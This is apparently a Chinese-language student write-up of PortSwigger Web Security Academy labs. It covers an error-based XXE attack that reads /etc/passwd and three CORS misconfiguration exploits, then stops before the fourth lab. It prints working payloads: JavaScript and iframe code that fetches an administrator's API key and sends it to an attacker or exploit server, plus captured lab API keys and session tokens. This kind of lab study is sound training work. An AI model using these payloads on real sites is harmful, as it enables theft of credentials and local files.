本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。

解决实验：请触发包含/etc/passwd文件内容的错误消息。

需要引用服务器上现有的DTD文件，并从中重新定义实体

使用GNOME桌面环境的系统通常在/usr/share/yelp/dtd/docbookx.dtd有一个DTD，其中包含一个名为ISOamso的实体。
```

### 答案

拦截抓包，修改数据包为

```
在XML声明和stockCheck元素之间插入以下参数实体定义：
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

这将导入Yelp DTD，然后重新定义ISOamso实体，触发包含/etc/passwd文件内容的错误消息

<img src=".\图片\Snipaste_2023-07-31_13-02-15.png" alt="Snipaste_2023-07-31_13-02-15" style="zoom:80%;" />

## 探测小技巧

通过**修改内容类型**的XXE攻击

1、大多数POST请求使用由HTML表单生成的默认内容类型，例如application/x-www-form-urlencoded。有些网站希望接收这种格式的请求，但也会容忍其他内容类型，包括XML。

```
例如，如果正常请求包含以下内容：
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
 
foo=bar
```

```
然后，可以提交以下请求，得到相同的结果：
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
 
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序允许在消息正文中包含XML的请求，并将正文内容解析为XML，那么只需将请求重新格式化为使用XML格式，就可以到达隐藏的XXE攻击面。 

# CORS

## 前置

1、简述：

跨源资源共享（CORS）是一种浏览器机制，它允许对位于给定域之外的资源进行受控访问。它扩展并增加了[同源策略](https://so.csdn.net/so/search?q=同源策略&spm=1001.2101.3001.7020)的灵活性（ 标准操作规程）.但如果网站的CORS策略配置和实施不当，也可能会导致跨域攻击。CORS无法抵御跨源攻击，如跨站点请求伪造 （CSRF）

2、同源策略

同源策略是一种限制性的跨源规范，它限制网站与源域之外的资源交互的能力。同源策略以应对潜在的恶意跨域交互，如一个网站窃取另一个网站的私人数据。它通常允许一个域向其他域发出请求，但不允许访问响应。 

3、放宽同源政策

同源政策的限制性很强，因此设计了各种方法来规避这些限制。许多网站与子域或第三方网站的交互方式需要完全跨源访问。使用跨来源资源共享（CORS）可以有控制地放宽同源政策

跨源资源共享协议使用一组HTTP头，这些头定义了受信任的Web源和相关属性，例如是否允许经过身份验证的访问。这些信息在浏览器和它试图访问的跨源网站之间的头交换中组合

## Lab1

### 前置

CORS配置问题导致的漏洞

服务器生成ACAO头从客户端指定的原始标头

1、一些应用程序需要提供对许多其他域的访问。维护允许的域列表需要不断的努力，任何错误都有可能破坏功能。因此，一些应用程序采取了有效地允许来自任何其他域的访问的简单途径

2、一种方法是从请求中阅读Origin头，并包含一个响应头，声明请求源是允许的

```
。例如，考虑接收以下请求的应用程序：
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
 
响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
 
这些报头声明允许从请求域（malicious-website.com）进行访问，并且跨源请求可以包括Cookie（Access-Control-Allow-Credentials：true），因此将在会话中处理。
```

3、由于应用程序在 Access-Control-Allow-Origin 标头中反映任意来源，这意味着任何域都可以访问易受攻击域中的资源。如果响应包含任何敏感信息（如API密钥或CSRF令牌），可以通过在网站上放置以下脚本来检索此信息：

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
 
function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

### 题目

实验1：具有基本原点反射的CORS脆弱性

```
Lab: [CORS](https://portswigger.net/web-security/cors) vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`
```

```
信息：

1、此网站具有不安全的CORS配置，因为它信任所有来源。

2、解决实验：编制一些JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交管理员的API密钥

3、已有账号：wiener:peter
```

### 答案

登陆账号，查看历史记录并观察到密钥是通过 AJAX 请求 `/accountDetails` 检索的，并且响应包含 `Access-Control-Allow-Credentials` 标头，表明它可能支持 CORS

<img src=".\图片\Snipaste_2023-07-31_13-44-39.png" alt="Snipaste_2023-07-31_13-44-39" style="zoom:80%;" />

将请求发送到Burp Repeater，并使用添加的标题重新提交：

```
Origin: https://example.com
```

观察到原点反映在Access-Control-Allow-Origin标头中

<img src=".\图片\Snipaste_2023-07-31_13-45-59.png" alt="Snipaste_2023-07-31_13-45-59" style="zoom:80%;" />

利用漏洞

在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为您的唯一实验室URL）

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
 
    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
 
我的是：
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0af9008f043411c18067263a00750022.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
 
    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

再漏洞利用服务器里操作

<img src=".\图片\Snipaste_2023-07-31_13-48-40.png" alt="Snipaste_2023-07-31_13-48-40" style="zoom:80%;" />

检索并提交受害者的API密钥提交

<img src=".\图片\Snipaste_2023-07-31_13-49-41.png" alt="Snipaste_2023-07-31_13-49-41" style="zoom:67%;" />

```
/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22sYL4DooN1O5ONOBC6OWmUH7if7HCqhwq%22,%20%20%22sessions%22:%20[%20%20%20%20%227mRUxaYkkZBELbmzOGHpoqTZB5rUXjZg%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

url解码后得到受害者 `apikey` 字段信息

```
sYL4DooN1O5ONOBC6OWmUH7if7HCqhwq
```

## Lab2

### 前置

#### 解析原始标头时出错

1、一些支持从多个来源访问的应用程序通过使用允许来源的白名单来实现这一点。当接收到CORS请求时，将提供的来源与白名单进行比较。如果来源出现在白名单上，则它将反映在Access-Control-Allow-Origin报头中，以便授予访问权限

```
如应用程序接收正常请求，如：
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
 
应用产品将对照其允许的来源列表检查提供的来源，如果来源在列表中，则按如下方式反映来源：
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

2、实施CORS原点白名单时经常会出现错误。一些组织决定允许从其所有子域（包括未来尚不存在的子域）进行访问。并且一些应用程序允许从各种其他组织的域（包括它们的子域）进行访问。这些规则通常通过匹配URL前缀或后缀，或使用正则表达式来实现。实现中的任何错误都可能导致访问权限被授予非预期的外部域。

```
1、假设某个应用程序赠款对以下列字符结尾的所有域的访问权限：
normal-website.com
 
攻击者可能能够通过注册以下域获得访问权限：
hackersnormal-website.com
 
2、假设应用程序赠款对以开头的所有域的访问权限
normal-website.com
 
攻击者可能能够使用以下域获得访问权限：
normal-website.com.evil-user.net
```

#### 白名单中的空原点值

1、原始标头的规范支持值null

```
浏览器可能会发送该值null在各种异常情况下的原始标题中：
    跨源重定向。
    来自序列化数据的请求。
    使用 file:协议请求。
    沙盒跨来源请求。
```

某些应用程序可能会将null支持应用程序的本地开发

```
例如，假设应用程序接收到以下跨来源请求：
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
 
并且服务器响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

在这种情况下，攻击者可以使用各种技巧生成包含该值的跨源请求null在原始标题中。这将满足白名单，从而实现跨域访问

```
例如，这可以使用沙箱来完成 内嵌框架跨来源申请表格：
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

### 题目

实验2：具有可信空源的CORS漏洞

```
信息：

1、此网站具有不安全的CORS配置，因为它信任"空"源。

2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api Key

3、已有账号：wiener:peter
```

```
Lab: CORS vulnerability with trusted null origin
APPRENTICE

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

### 解答

登陆账号，单击"我的帐户"，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS

将请求发送到Burp Repeater，并使用添加的标题重新提交

```
Origin: null
```

<img src=".\图片\Snipaste_2023-07-31_14-00-05.png" alt="Snipaste_2023-07-31_14-00-05" style="zoom:80%;" />

漏洞利用

在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
 
我的是：
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aca00d603f8539e803b0da20078008c.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0ad1000703375348809f0c82010900f5.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

单击"Access log"（访问日志）

<img src=".\图片\Snipaste_2023-07-31_14-02-50.png" alt="Snipaste_2023-07-31_14-02-50" style="zoom:80%;" />

得到受害者的 apikey 信息，url 解码得

```
B7E7bh9wQCkSVBYPnFX51krYzwhpmCrK
```

## Lab3

### 前置

#### 通过 CORS信任关系利用XSS

即使"正确"配置的CORS也会在两个源之间建立信任关系。如果网站信任易受跨站点脚本攻击的源（ XSS语言），则攻击者可以利用XSS注入一些JavaScript，该JavaScript使用CORS从信任易受攻击应用程序的站点检索敏感信息

```
如以下请求：
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
 
如果服务器响应为：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
 
然后，在www.example.com上发现XSS漏洞的攻击者subdomain.vulnerable-website.com可以使用如下URL检索API密钥：
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

#### 使用配置不当的CORS中断TLS

假设严格使用HTTPS的应用程序也将使用纯HTTP的受信任子域列入白名单。

```
例如，当应用程序接收到以下请求时：
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
 
应用程序响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

在这种情况下，能够拦截受害用户通信量的攻击者可以利用CORS配置危害受害用户与应用程序的交互。

```
此攻击涉及以下步骤：
1、受害者用户发出任何普通HTTP请求。
2、攻击者注入重定向到：
    http://trusted-subdomain.vulnerable-website.com
    受害者的浏览器会跟随重定向。
3、攻击者拦截普通HTTP请求，并将包含CORS请求的欺骗响应返回到：
    https://vulnerable-website.com
4、受害者的浏览器发出CORS请求，包括来源：
    http://trusted-subdomain.vulnerable-website.com
    应用程序允许该请求，因为这是 白名单 起源。请求的敏感数据在响应中返回。
    攻击者的欺骗页面可以读取敏感数据，并将其传输到攻击者控制下的任何域。
```

即使易受攻击的网站在使用HTTPS方面非常健壮，没有HTTP端点并且所有Cookie都标记为安全，此攻击也会有效。 

### 题目

实验3：受信任的不安全协议的CORS漏洞

```
Lab: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。

2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key

3、已有账号：wiener:peter
```

### 答案

将请求发送到Burp Repeater，并使用添加的标题Origin重新提交

```
Origin:http://subdomain.lab-id
（lab-id 是实验室域名）
 
我的是：
Origin:http://subdomain.0ab300ad04e5a886807d0343005000a7.web-security-academy.net
```

观察来源是否反映在Access-Control-Allow-Origin标头中，确认CORS配置**是否允许从任意子域**（HTTPS和HTTP）进行访问

<img src=".\图片\Snipaste_2023-07-31_14-19-24.png" alt="Snipaste_2023-07-31_14-19-24" style="zoom:80%;" />

组合利用
打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的

注意到productID参数易受XSS攻击

<img src=".\图片\e827db6a641348ab9a448df6d0cfe9aa.png" alt="e827db6a641348ab9a448df6d0cfe9aa" style="zoom:80%;" />

在浏览器中，转到**漏洞利用服务器**并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：

```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
 
我的是：
<script>
    document.location="http://stock.0ab300ad04e5a886807d0343005000a7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab300ad04e5a886807d0343005000a7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a460085044aa83a80fb020001cd0058.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

得到 apikey 字段

```
10.0.4.168      2023-07-31 06:23:18 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22gQQG66RHRz5nlRKXTonlBg40oIn9qQ3G%22,%20%20%22sessions%22:%20[%20%20%20%20%22AiESAXBxMMwKWcv6SnZZIUjB8f51z8g1%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

```
gQQG66RHRz5nlRKXTonlBg40oIn9qQ3G
```

## Lab4

### 前置

没有凭据的内部网和CORS

1、大多数CORS攻击依赖于响应报头的存在：

```
Access-Control-Allow-Credentials: true
```

如果没有该标头，受害用户的浏览器将拒绝发送他们的cookie，这意味着攻击者只能访问未经身份验证的内容，他们可以通过直接浏览目标网站轻松访问这些内容。

2、但有一种常见的情况是攻击者无法直接访问网站：当它是组织内部网的一部分，并且位于私有IP地址空间中时。内部网站的安全标准通常低于外部网站，这使得攻击者能够找到漏洞并获得进一步的访问权限。

```
例如，专用网络内的跨来源请求可以如下：
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
 
并且服务器响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

3、应用程序服务器信任来自任何来源的资源请求，而无需凭据。如果私有IP地址空间内的用户访问公共Internet，则可以从外部站点执行基于CORS的攻击，该外部站点使用受害者的浏览器作为访问内部网资源的代理。



太麻烦了不做了
